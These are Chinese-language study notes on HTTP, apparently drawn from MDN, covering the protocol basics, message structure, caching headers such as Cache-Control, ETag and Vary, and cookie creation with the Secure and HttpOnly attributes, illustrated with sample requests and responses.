# HTTP

[TOC]



##  1. HTTP 概述

**HTTP是一种能够获取如 HTML 这样的网络资源的** [protocol](https://developer.mozilla.org/zh-CN/docs/Glossary/Protocol)(通讯协议)。**它是在 Web 上进行数据交换的基础，是一种 client-server 协议，也就是说，请求通常是由像浏览器这样的接受方发起的。一个完整的Web文档通常是由不同的子文档拼接而成的，像是文本、布局描述、图片、视频、脚本等等。**

![A Web document is the composition of different resources](https://mdn.mozillademos.org/files/13677/Fetching_a_page.png)

客户端和服务端通过交换各自的消息（与数据流正好相反）进行交互。由像浏览器这样的客户端发出的消息叫做 *requests*，被服务端响应的消息叫做 *responses。*

![HTTP as an application layer protocol, on top of TCP (transport layer) and IP (network layer) and below the presentation layer.](https://mdn.mozillademos.org/files/13673/HTTP%20&%20layers.png)HTTP被设计于20世纪90年代初期，是一种可扩展的协议。它是应用层的协议，通过[TCP](https://developer.mozilla.org/zh-CN/docs/Glossary/TCP)，或者是[TLS](https://developer.mozilla.org/zh-CN/docs/Glossary/TLS)－加密的TCP连接来发送，理论上任何可靠的传输协议都可以使用。因为其良好的扩展性，时至今日，它不仅被用来传输超文本文档，还用来传输图片、视频或者向服务器发送如HTML表单这样的信息。HTTP还可以根据网页需求，仅获取部分Web文档内容更新网页。

### 1.1 基于HTTP的组件系统

HTTP是一个client-server协议：请求通过一个实体被发出，实体也就是用户代理。大多数情况下，这个用户代理都是指浏览器，当然它也可能是任何东西，比如一个爬取网页生成维护搜索引擎索引的机器爬虫。

每一个发送到服务器的请求，都会被服务器处理并返回一个消息，也就是*response。*在这个请求与响应之间，还有许许多多的被称为[proxies](https://developer.mozilla.org/en-US/docs/Glossary/Proxy)的实体，他们的作用与表现各不相同，比如有些是网关，还有些是[caches](https://developer.mozilla.org/zh-CN/docs/Glossary/Cache)等。

![img](https://mdn.mozillademos.org/files/13679/Client-server-chain.png)

实际上，在一个浏览器和处理请求的服务器之间，还有路由器、调制解调器等许多计算机。由于Web的层次设计，那些在网络层和传输层的细节都被隐藏起来了。HTTP位于最上层的应用层。虽然底层对于分析网络问题非常重要，但是大多都跟对HTTP的描述不相干。

#### [客户端：user-agent](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Overview#客户端：user-agent)

user-agent 就是任何能够为用户发起行为的工具。这个角色通常都是由浏览器来扮演。一些例外情况，比如是工程师使用的程序，以及Web开发人员调试应用程序。

浏览器**总是**作为发起一个请求的实体，他永远不是服务器（虽然近几年已经出现一些机制能够模拟由服务器发起的请求消息了）。

要展现一个网页，浏览器首先发送一个请求来获取页面的HTML文档，再解析文档中的资源信息发送其他请求，获取可执行脚本或CSS样式来进行页面布局渲染，以及一些其它页面资源（如图片和视频等）。然后，浏览器将这些资源整合到一起，展现出一个完整的文档，也就是网页。浏览器执行的脚本可以在之后的阶段获取更多资源，并相应地更新网页。

一个网页就是一个超文本文档。也就是说，有一部分显示的文本可能是链接，启动它（通常是鼠标的点击）就可以获取一个新的网页，使得用户可以控制客户端进行网上冲浪。浏览器来负责发送HTTP请求，并进一步解析HTTP返回的消息，以向用户提供明确的响应。

#### [Web服务端](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Overview#Web服务端)

在上述通信过程的另一端，是由Web Server来*服务*并提供客户端所请求的文档。Server只是虚拟意义上代表一个机器：它可以是共享负载（负载均衡）的一组服务器组成的计算机集群，也可以是一种复杂的软件，通过向其他计算机（如缓存，数据库服务器，电子商务服务器 ...）发起请求来获取部分或全部资源。

Server 不一定是一台机器，但一个机器上可以装载的众多Servers。在HTTP/1.1 和[`Host`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Host)头部中，它们甚至可以共享同一个IP地址。

#### [代理（Proxies）](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Overview#代理（Proxies）)

在浏览器和服务器之间，有许多计算机和其他设备转发了HTTP消息。由于Web栈层次结构的原因，它们大多都出现在传输层、网络层和物理层上，对于HTTP应用层而言就是透明的，虽然它们可能会对应用层性能有重要影响。还有一部分是表现在应用层上的，被称为**代理（Proxies）**。代理（Proxies）既可以表现得透明，又可以不透明（“改变请求”会通过它们）。代理主要有如下几种作用：

- 缓存（可以是公开的也可以是私有的，像浏览器的缓存）
- 过滤（像反病毒扫描，家长控制...）
- 负载均衡（让多个服务器服务不同的请求）
- 认证（对不同资源进行权限管理）
- 日志记录（允许存储历史信息）

### 1.2 HTTP的基本性质

> #### HTTP 是简单的

虽然下一代HTTP/2协议将HTTP消息封装到了帧（frames）中，HTTP大体上还是被设计得简单易读。HTTP报文能够被人读懂，还允许简单测试，降低了门槛，对新人很友好。

> #### HTTP 是可扩展的

在 HTTP/1.0 中出现的 [HTTP headers](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers) 让协议扩展变得非常容易。只要服务端和客户端就新 headers 达成语义一致，新功能就可以被轻松加入进来。

> #### HTTP 是无状态，有会话的

HTTP是无状态的：在同一个连接中，两个执行成功的请求之间是没有关系的。这就带来了一个问题，用户没有办法在同一个网站中进行连续的交互，比如在一个电商网站里，用户把某个商品加入到购物车，切换一个页面后再次添加了商品，这两次添加商品的请求之间没有关联，浏览器无法知道用户最终选择了哪些商品。而使用HTTP的头部扩展，HTTP Cookies就可以解决这个问题。把Cookies添加到头部中，创建一个会话让每次请求都能共享相同的上下文信息，达成相同的状态。

注意，HTTP本质是无状态的，使用Cookies可以创建有状态的会话。

> #### HTTP 和连接

一个连接是由传输层来控制的，这从根本上不属于HTTP的范围。HTTP并不需要其底层的传输层协议是面向连接的，只需要它是可靠的，或不丢失消息的（至少返回错误）。在互联网中，有两个最常用的传输层协议：TCP是可靠的，而UDP不是。因此，HTTP依赖于面向连接的TCP进行消息传递，但连接并不是必须的。

在客户端（通常指浏览器）与服务器能够交互（客户端发起请求，服务器返回响应）之前，必须在这两者间建立一个 TCP 链接，打开一个 TCP 连接需要多次往返交换消息（因此耗时）。HTTP/1.0 默认为每一对 HTTP 请求/响应都打开一个单独的 TCP 连接。当需要连续发起多个请求时，这种模式比多个请求共享同一个 TCP 链接更低效。

为了减轻这些缺陷，HTTP/1.1引入了流水线（被证明难以实现）和持久连接的概念：底层的TCP连接可以通过[`Connection`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Connection)头部来被部分控制。HTTP/2则发展得更远，通过在一个连接复用消息的方式来让这个连接始终保持为暖连接。 

为了更好的适合HTTP，设计一种更好传输协议的进程一直在进行。Google就研发了一种以UDP为基础，能提供更可靠更高效的传输协议[QUIC](https://en.wikipedia.org/wiki/QUIC)。

### 1.3 HTTP能控制什么?

多年以来，HTTP良好的扩展性使得越来越多的Web功能归其控制。缓存和认证很早就可以由HTTP来控制了。另一方面，对同源同域的限制到2010年才有所改变。

以下是可以被HTTP控制的常见特性。

- [缓存 ](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Caching)
  文档如何缓存能通过HTTP来控制。服务端能告诉代理和客户端哪些文档需要被缓存，缓存多久，而客户端也能够命令中间的缓存代理来忽略存储的文档。
- *开放同源限制*
  为了防止网络窥听和其它隐私泄漏，浏览器强制对Web网站做了分割限制。只有来自于**相同来源**的网页才能够获取网站的全部信息。这样的限制有时反而成了负担，HTTP可以通过修改头部来开放这样的限制，因此Web文档可以是由不同域下的信息拼接成的（某些情况下，这样做还有安全因素考虑）。
- *认证*
  一些页面能够被保护起来，仅让特定的用户进行访问。基本的认证功能可以直接通过HTTP提供，使用[`Authenticate`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Authenticate)相似的头部即可，或用HTTP Cookies来设置指定的会话。
- *[代理和隧道](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Proxy_servers_and_tunneling)*
  通常情况下，服务器和/或客户端是处于内网的，对外网隐藏真实 IP 地址。因此 HTTP 请求就要通过代理越过这个网络屏障。但并非所有的代理都是 HTTP 代理。例如，SOCKS协议的代理就运作在更底层，一些像 FTP 这样的协议也能够被它们处理。
- *会话* 
  使用HTTP Cookies允许你用一个服务端的状态发起请求，这就创建了会话。虽然基本的HTTP是无状态协议。这很有用，不仅是因为这能应用到像购物车这样的电商业务上，更是因为这使得任何网站都能轻松为用户定制展示内容了。

### 1.4 HTTP流

当客户端想要和服务端进行信息交互时（服务端是指最终服务器，或者是一个中间代理），过程表现为下面几步：

1. 打开一个TCP连接：TCP连接被用来发送一条或多条请求，以及接受响应消息。客户端可能打开一条新的连接，或重用一个已经存在的连接，或者也可能开几个新的TCP连接连向服务端。

2. 发送一个HTTP报文：HTTP报文（在HTTP/2之前）是语义可读的。在HTTP/2中，这些简单的消息被封装在了帧中，这使得报文不能被直接读取，但是原理仍是相同的。

   ```html
   GET / HTTP/1.1
   Host: developer.mozilla.org
   Accept-Language: fr
   ```

3. 读取服务端返回的报文信息：

   ```html
   HTTP/1.1 200 OK
   Date: Sat, 09 Oct 2010 14:28:02 GMT
   Server: Apache
   Last-Modified: Tue, 01 Dec 2009 20:18:22 GMT
   ETag: "51142bc1-7449-479b075b2891b"
   Accept-Ranges: bytes
   Content-Length: 29769
   Content-Type: text/html
   
   <!DOCTYPE html... (here comes the 29769 bytes of the requested web page)
   ```

4. 关闭连接或者为后续请求重用连接。

当HTTP流水线启动时，后续请求都可以不用等待第一个请求的成功响应就被发送。然而HTTP流水线已被证明很难在现有的网络中实现，因为现有网络中有很多老旧的软件与现代版本的软件共存。因此，HTTP流水线已被在有多请求下表现得更稳健的HTTP/2的帧所取代。

### 1.5 HTTP报文

HTTP/1.1以及更早的HTTP协议报文都是语义可读的。在HTTP/2中，这些报文被嵌入到了一个新的二进制结构，帧。帧允许实现很多优化，比如报文头部的压缩和复用。即使只有原始HTTP报文的一部分以HTTP/2发送出来，每条报文的语义依旧不变，客户端会重组原始HTTP/1.1请求。因此用HTTP/1.1格式来理解HTTP/2报文仍旧有效。

有两种HTTP报文的类型，请求与响应，每种都有其特定的格式。

> #### 请求

HTTP请求的一个例子：

![A basic HTTP request](https://mdn.mozillademos.org/files/13687/HTTP_Request.png)

请求由以下元素组成：

- 一个HTTP的[method](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods)，经常是由一个动词像[`GET`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/GET), [`POST`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/POST) 或者一个名词像[`OPTIONS`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/OPTIONS)，[`HEAD`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/HEAD)来定义客户端的动作行为。通常客户端的操作都是获取资源（GET方法）或者发送[HTML form](https://developer.mozilla.org/en-US/docs/Web/Guide/HTML/Forms)表单值（POST方法），虽然在一些情况下也会有其他操作。
- 要获取的资源的路径，通常是上下文中就很明显的元素资源的URL，它没有[protocol](https://developer.mozilla.org/zh-CN/docs/Glossary/Protocol) （`http://`），[domain](https://developer.mozilla.org/zh-CN/docs/Glossary/Domain)（`developer.mozilla.org`），或是TCP的[port](https://developer.mozilla.org/en-US/docs/Glossary/port)（HTTP一般在80端口）。
- HTTP协议版本号。
- 为服务端表达其他信息的可选头部[headers](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers)。
- 对于一些像POST这样的方法，报文的body就包含了发送的资源，这与响应报文的body类似。

> #### 响应

HTTP响应的一个例子：

![img](https://mdn.mozillademos.org/files/13691/HTTP_Response.png)

响应报文包含了下面的元素：

- HTTP协议版本号。
- 一个状态码（[status code](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status)），来告知对应请求执行成功或失败，以及失败的原因。
- 一个状态信息，这个信息是非权威的状态码描述信息，可以由服务端自行设定。
- HTTP [headers](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers)，与请求头部类似。
- 可选项，比起请求报文，响应报文中更常见地包含获取的资源body。

### 1.6 基于HTTP的APIs

基于HTTP的最常用API是[`XMLHttpRequest`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest) API，可用于在[user agent](https://developer.mozilla.org/zh-CN/docs/Glossary/User_agent)和服务器之间交换数据。 现代[`Fetch API`](https://developer.mozilla.org/zh-CN/docs/Web/API/Fetch_API)提供相同的功能，具有更强大和灵活的功能集。

另一种API，即服务器发送的事件，是一种单向服务，允许服务器使用HTTP作为传输机制向客户端发送事件。 使用[`EventSource`](https://developer.mozilla.org/zh-CN/docs/Web/API/EventSource)接口，客户端打开连接并建立事件句柄。 客户端浏览器自动将到达HTTP流的消息转换为适当的[`Event`](https://developer.mozilla.org/zh-CN/docs/Web/API/Event)对象，并将它们传递给专门处理这类[`type`](https://developer.mozilla.org/zh-CN/docs/Web/API/Event/type)事件的句柄，如果有这么个句柄的话。但如果相应的事件处理句柄根本没有建立，那就交给[`onmessage`](https://developer.mozilla.org/zh-CN/docs/Web/API/EventSource/onmessage)事件处理程序处理。

### 1.7 概述总结

HTTP是一种简单可扩展的协议，其Client-Server的结构以及轻松扩展头部信息的能力使得HTTP可以和Web共同发展。

即使HTTP/2为了提高性能将HTTP报文嵌入到帧中这一举措增加了复杂度，但是从Web应用的角度看，报文的基本结构没有变化，从HTTP/1.0发布起就是这样的结构。会话流依旧简单，通过一个简单的 [HTTP message monitor](https://developer.mozilla.org/en-US/docs/Tools/Network_Monitor)就可以查看和纠错。

----

## 2. HTTP缓存

通过复用以前获取的资源，可以显著提高网站和应用程序的性能。Web 缓存减少了等待时间和网络流量，因此减少了显示资源表示形式所需的时间。通过使用 HTTP缓存，变得更加响应性。

### 2.1 不同种类的缓存

缓存是一种保存资源副本并在下次请求时直接使用该副本的技术。当 web 缓存发现请求的资源已经被存储，它会拦截请求，返回该资源的拷贝，而不会去源服务器重新下载。这样带来的好处有：缓解服务器端压力，提升性能(获取资源的耗时更短了)。对于网站来说，缓存是达到高性能的重要组成部分。缓存需要合理配置，因为并不是所有资源都是永久不变的：重要的是对一个资源的缓存应截止到其下一次发生改变（即不能缓存过期的资源）。

缓存的种类有很多,其大致可归为两类：私有与共享缓存。共享缓存存储的响应能够被多个用户使用。私有缓存只能用于单独用户。本文将主要介绍浏览器与代理缓存，除此之外还有网关缓存、CDN、反向代理缓存和负载均衡器等部署在服务器上的缓存方式，为站点和 web 应用提供更好的稳定性、性能和扩展性。

![What a cache provide, advantages/disadvantages of shared/private caches.](https://mdn.mozillademos.org/files/13777/HTTPCachtType.png)

> #### (私有)浏览器缓存

私有缓存只能用于单独用户。你可能已经见过浏览器设置中的“缓存”选项。浏览器缓存拥有用户通过 [HTTP](https://developer.mozilla.org/en-US/docs/Web/HTTP) 下载的所有文档。这些缓存为浏览过的文档提供向后/向前导航，保存网页，查看源码等功能，可以避免再次向服务器发起多余的请求。它同样可以提供缓存内容的离线浏览。

> #### (共享)代理缓存

共享缓存可以被多个用户使用。例如，ISP 或你所在的公司可能会架设一个 web 代理来作为本地网络基础的一部分提供给用户。这样热门的资源就会被重复使用，减少网络拥堵与延迟。

### 2.2 缓存操作的目标

虽然 HTTP 缓存不是必须的，但重用缓存的资源通常是必要的。然而常见的 HTTP 缓存只能存储 [`GET`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/GET) 响应，对于其他类型的响应则无能为力。缓存的关键主要包括request method和目标URI（一般只有GET请求才会被缓存）。 普遍的缓存案例:

- 一个检索请求的成功响应: 对于 [`GET`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/GET)请求，响应状态码为：[`200`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/200)，则表示为成功。一个包含例如HTML文档，图片，或者文件的响应。
- 永久重定向: 响应状态码：[`301`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/301)。
- 错误响应: 响应状态码：[`404`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/404) 的一个页面。
- 不完全的响应: 响应状态码 [`206`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/206)，只返回局部的信息。
- 除了 [`GET`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/GET) 请求外，如果匹配到作为一个已被定义的cache键名的响应。

针对一些特定的请求，也可以通过关键字区分多个存储的不同响应以组成缓存的内容。具体参考[下文](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Caching_FAQ#varying responses)关于 [`Vary`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Vary) 的信息。

### 2.3 缓存控制

#### Cache-control 头

**HTTP/1.1**定义的 [`Cache-Control`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Cache-Control) 头用来区分对缓存机制的支持情况， 请求头和响应头都支持这个属性。通过它提供的不同的值来定义缓存策略。

> #### 没有缓存

缓存中不得存储任何关于客户端请求和服务端响应的内容。每次由客户端发起的请求都会下载完整的响应内容。

```html
Cache-Control: no-store
```

> #### 缓存但重新验证

如下头部定义，此方式下，每次有请求发出时，缓存会将此请求发到服务器（译者注：该请求应该会带有与本地缓存相关的验证字段），服务器端会验证请求中所描述的缓存是否过期，若未过期（注：实际就是返回304），则缓存才使用本地缓存副本。

```html
Cache-Control: no-cache
```

> #### 私有和公共缓存

"public" 指令表示该响应可以被任何中间人（译者注：比如中间代理、CDN等）缓存。若指定了"public"，则一些通常不被中间人缓存的页面（译者注：因为默认是private）（比如 带有HTTP验证信息（帐号密码）的页面 或 某些特定状态码的页面），将会被其缓存。

而 "private" 则表示该响应是专用于某单个用户的，中间人不能缓存此响应，该响应只能应用于浏览器私有缓存中。

```html
Cache-Control: private
Cache-Control: public
```

> #### 过期

过期机制中，最重要的指令是 "`max-age=<seconds>`"，表示资源能够被缓存（保持新鲜）的最大时间。相对[Expires](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Expires)而言，max-age是距离请求发起的时间的秒数。针对应用中那些不会改变的文件，通常可以手动设置一定的时长以保证缓存有效，例如图片、css、js等静态资源。

详情看下文关于[缓存有效性](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Caching_FAQ#Freshness)的内容。

```html
Cache-Control: max-age=31536000
```

> #### 验证方式

当使用了 "`must-revalidate`" 指令，那就意味着缓存在考虑使用一个陈旧的资源时，必须先验证它的状态，已过期的缓存将不被使用。详情看下文关于[缓存校验](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Caching_FAQ#Cache_validation)的内容。

```html
Cache-Control: must-revalidate
```

#### Pragma 头

[`Pragma`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Pragma) 是**HTTP/1.0**标准中定义的一个header属性，请求中包含Pragma的效果跟在头信息中定义Cache-Control: no-cache相同，但是HTTP的响应头没有明确定义这个属性，所以它不能拿来完全替代HTTP/1.1中定义的Cache-control头。通常定义Pragma以向后兼容基于HTTP/1.0的客户端。

### 2.4 新鲜度

理论上来讲，当一个资源被缓存存储后，该资源应该可以被永久存储在缓存中。由于缓存只有有限的空间用于存储资源副本，所以缓存会定期地将一些副本删除，这个过程叫做缓存驱逐。另一方面，当服务器上面的资源进行了更新，那么缓存中的对应资源也应该被更新，由于HTTP是C/S模式的协议，服务器更新一个资源时，不可能直接通知客户端更新缓存，所以双方必须为该资源约定一个过期时间，在该过期时间之前，该资源（缓存副本）就是新鲜的，当过了过期时间后，该资源（缓存副本）则变为陈旧的*。*驱逐算法用于将陈旧的资源（缓存副本）替换为新鲜的，注意，一个陈旧的资源（缓存副本）是不会直接被清除或忽略的，当客户端发起一个请求时，缓存检索到已有一个对应的陈旧资源（缓存副本），则缓存会先将此请求附加一个`If-None-Match`头，然后发给目标服务器，以此来检查该资源副本是否是依然还是算新鲜的，若服务器返回了 [`304`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/304) (Not Modified)（该响应不会有带有实体信息），则表示此资源副本是新鲜的，这样一来，可以节省一些带宽。若服务器通过 If-None-Match 或 If-Modified-Since判断后发现已过期，那么会带有该资源的实体内容返回。

下面是上述缓存处理过程的一个图示：

![Show how a proxy cache acts when a doc is not cache, in the cache and fresh, in the cache and stale.](https://mdn.mozillademos.org/files/13771/HTTPStaleness.png)

对于含有特定头信息的请求，会去计算缓存寿命。比如`Cache-control: max-age=N`的头，相应的缓存的寿命就是`N`。通常情况下，对于不含这个属性的请求则会去查看是否包含[Expires](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Expires)属性，通过比较Expires的值和头里面[Date](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Date)属性的值来判断是否缓存还有效。如果max-age和expires属性都没有，找找头里的[Last-Modified](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Last-Modified)信息。如果有，缓存的寿命就等于头里面Date的值减去Last-Modified的值除以10（注：根据rfc2626其实也就是乘以10%）。

缓存失效时间计算公式如下：

```
expirationTime = responseTime + freshnessLifetime - currentAge
```

上式中，`responseTime` 表示浏览器接收到此响应的那个时间点。

> #### 改进资源

我们使用缓存的资源越多，网站的响应能力和性能就会越好。为了优化缓存，过期时间设置得尽量长是一种很好的策略。对于定期或者频繁更新的资源，这么做是比较稳妥的，但是对于那些长期不更新的资源会有点问题。这些固定的资源在一定时间内受益于这种长期保持的缓存策略，但一旦要更新就会很困难。特指网页上引入的一些js/css文件，当它们变动时需要尽快更新线上资源。

web开发者发明了一种被 Steve Souders 称之为 `revving` 的技术[[1\]](https://www.stevesouders.com/blog/2008/08/23/revving-filenames-dont-use-querystring/) 。不频繁更新的文件会使用特定的命名方式：在URL后面（通常是文件名后面）会加上版本号。加上版本号后的资源就被视作一个完全新的独立的资源，同时拥有一年甚至更长的缓存过期时长。但是这么做也存在一个弊端，所有引用这个资源的地方都需要更新链接。web开发者们通常会采用自动化构建工具在实际工作中完成这些琐碎的工作。当低频更新的资源（js/css）变动了，只用在高频变动的资源文件（html）里做入口的改动。

这种方法还有一个好处：同时更新两个缓存资源不会造成部分缓存先更新而引起新旧文件内容不一致。对于互相有依赖关系的css和js文件，避免这种不一致性是非常重要的。

![img](https://mdn.mozillademos.org/files/13779/HTTPRevved.png)

加在加速文件后面的版本号不一定是一个正式的版本号字符串，如1.1.3这样或者其他固定自增的版本数。它可以是任何防止缓存碰撞的标记例如hash或者时间戳。

### 2.5 缓存验证

用户点击刷新按钮时会开始缓存验证。如果缓存的响应头信息里含有"Cache-control: must-revalidate”的定义，在浏览的过程中也会触发缓存验证。另外，在浏览器偏好设置里设置Advanced->Cache为强制验证缓存也能达到相同的效果。

当缓存的文档过期后，需要进行缓存验证或者重新获取资源。只有在服务器返回强校验器或者弱校验器时才会进行验证。

> #### ETags

作为缓存的一种强校验器，[`ETag`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/ETag) 响应头是一个对用户代理(User Agent, 下面简称UA)不透明（译者注：UA 无需理解，只需要按规定使用即可）的值。对于像浏览器这样的HTTP UA，不知道ETag代表什么，不能预测它的值是多少。如果资源请求的响应头里含有ETag, 客户端可以在后续的请求的头中带上 [`If-None-Match`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/If-None-Match) 头来验证缓存。

[`Last-Modified`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Last-Modified) 响应头可以作为一种弱校验器。说它弱是因为它只能精确到一秒。如果响应头里含有这个信息，客户端可以在后续的请求中带上 [`If-Modified-Since`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/If-Modified-Since) 来验证缓存。

当向服务端发起缓存校验的请求时，服务端会返回 [`200`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/200) ok表示返回正常的结果或者 [`304`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/304) Not Modified(不返回body)表示浏览器可以使用本地缓存文件。304的响应头也可以同时更新缓存文档的过期时间。

### 2.6 Vary响应

[`Vary`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Vary) HTTP 响应头决定了对于后续的请求头，如何判断是请求一个新的资源还是使用缓存的文件。

当缓存服务器收到一个请求，只有当前的请求和原始（缓存）的请求头跟缓存的响应头里的Vary都匹配，才能使用缓存的响应。

![The Vary header leads cache to use more HTTP headers as key for the cache.](https://mdn.mozillademos.org/files/13769/HTTPVary.png)

使用vary头有利于内容服务的动态多样性。例如，使用Vary: User-Agent头，缓存服务器需要通过UA判断是否使用缓存的页面。如果需要区分移动端和桌面端的展示内容，利用这种方式就能避免在不同的终端展示错误的布局。另外，它可以帮助 Google 或者其他搜索引擎更好地发现页面的移动版本，并且告诉搜索引擎没有引入[Cloaking](https://en.wikipedia.org/wiki/Cloaking)。

```html
Vary: User-Agent
```

因为移动版和桌面的客户端的请求头中的User-Agent不同， 缓存服务器不会错误地把移动端的内容输出到桌面端到用户。

----

## 3. HTTP Cookie

HTTP Cookie（也叫 Web Cookie 或浏览器 Cookie）是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。通常，它用于告知服务端两个请求是否来自同一浏览器，如保持用户的登录状态。Cookie 使基于[无状态](https://developer.mozilla.org/en-US/docs/Web/HTTP/Overview#HTTP_is_stateless_but_not_sessionless)的HTTP协议记录稳定的状态信息成为了可能。

Cookie 主要用于以下三个方面：

- 会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息）
- 个性化设置（如用户自定义设置、主题等）
- 浏览器行为跟踪（如跟踪分析用户行为等）

Cookie 曾一度用于客户端数据的存储，因当时并没有其它合适的存储办法而作为唯一的存储手段，但现在随着现代浏览器开始支持各种各样的存储方式，Cookie 渐渐被淘汰。由于服务器指定 Cookie 后，浏览器的每次请求都会携带 Cookie 数据，会带来额外的性能开销（尤其是在移动环境下）。新的浏览器API已经允许开发者直接将数据存储到本地，如使用 [Web storage API](https://developer.mozilla.org/zh-CN/docs/Web/API/Web_Storage_API) （本地存储和会话存储）或 [IndexedDB](https://developer.mozilla.org/zh-CN/docs/Web/API/IndexedDB_API) 。

### 3.1 创建Cookie

当服务器收到 HTTP 请求时，服务器可以在响应头里面添加一个 [`Set-Cookie`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Set-Cookie) 选项。浏览器收到响应后通常会保存下 Cookie，之后对该服务器每一次请求中都通过 [`Cookie`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Cookie) 请求头部将 Cookie 信息发送给服务器。另外，Cookie 的过期时间、域、路径、有效期、适用站点都可以根据需要来指定。

#### Set-Cookie响应头部和Cookie请求头部

服务器使用 [`Set-Cookie`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Set-Cookie) 响应头部向用户代理（一般是浏览器）发送 Cookie信息。一个简单的 Cookie 可能像这样：

```
Set-Cookie: <cookie名>=<cookie值>
```

服务器通过该头部告知客户端保存 Cookie 信息。

```
HTTP/1.0 200 OK
Content-type: text/html
Set-Cookie: yummy_cookie=choco
Set-Cookie: tasty_cookie=strawberry

[页面内容]
```

现在，对该服务器发起的每一次新请求，浏览器都会将之前保存的Cookie信息通过 [`Cookie`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Cookie) 请求头部再发送给服务器。

```
GET /sample_page.html HTTP/1.1
Host: www.example.org
Cookie: yummy_cookie=choco; tasty_cookie=strawberry
```

**提示:** 如何在以下几种服务端程序中设置 `Set-Cookie` 响应头信息 :

- [PHP](https://secure.php.net/manual/en/function.setcookie.php)
- [Node.JS](https://nodejs.org/dist/latest-v8.x/docs/api/http.html#http_response_setheader_name_value)
- [Python](https://docs.python.org/3/library/http.cookies.html)
- [Ruby on Rails](https://api.rubyonrails.org/classes/ActionDispatch/Cookies.html)

#### 定义 Cookie 的生命周期

Cookie 的生命周期可以通过两种方式定义：

- 会话期 Cookie 是最简单的 Cookie：浏览器关闭之后它会被自动删除，也就是说它仅在会话期内有效。会话期Cookie不需要指定过期时间（`Expires`）或者有效期（`Max-Age`）。需要注意的是，有些浏览器提供了会话恢复功能，这种情况下即使关闭了浏览器，会话期Cookie 也会被保留下来，就好像浏览器从来没有关闭一样，这会导致 Cookie 的生命周期无限期延长。
- 持久性 Cookie 的生命周期取决于过期时间（`Expires`）或有效期（`Max-Age`）指定的一段时间。

例如：

```
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
```

**提示：**当Cookie的过期时间被设定时，设定的日期和时间只与客户端相关，而不是服务端。

如果您的站点对用户进行身份验证，则每当用户进行身份验证时，它都应重新生成并重新发送会话 Cookie，甚至是已经存在的会话 Cookie。此技术有助于防止[会话固定攻击（session fixation attacks）](https://wiki.developer.mozilla.org/en-US/docs/Web/Security/Types_of_attacks#Session_fixation)，在该攻击中第三方可以重用用户的会话。

#### 限制访问 Cookie

有两种方法可以确保 `Cookie` 被安全发送，并且不会被意外的参与者或脚本访问：`Secure` 属性和`HttpOnly` 属性。

标记为 `Secure` 的 Cookie 只应通过被 HTTPS 协议加密过的请求发送给服务端，因此可以预防 [man-in-the-middle](https://developer.mozilla.org/zh-CN/docs/Glossary/MitM) 攻击者的攻击。但即便设置了 `Secure` 标记，敏感信息也不应该通过 Cookie 传输，因为 Cookie 有其固有的不安全性，`Secure` 标记也无法提供确实的安全保障, 例如，可以访问客户端硬盘的人可以读取它。

从 Chrome 52 和 Firefox 52 开始，不安全的站点（`http:`）无法使用Cookie的 `Secure` 标记。

JavaScript [`Document.cookie`](https://developer.mozilla.org/zh-CN/docs/Web/API/Document/cookie) API 无法访问带有 `HttpOnly` 属性的cookie；此类 Cookie 仅作用于服务器。例如，持久化服务器端会话的 Cookie 不需要对 JavaScript 可用，而应具有 `HttpOnly` 属性。此预防措施有助于缓解[跨站点脚本（XSS）](https://wiki.developer.mozilla.org/zh-CN/docs/Web/Security/Types_of_attacks#Cross-site_scripting_(XSS))攻击。

示例：

```
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
```

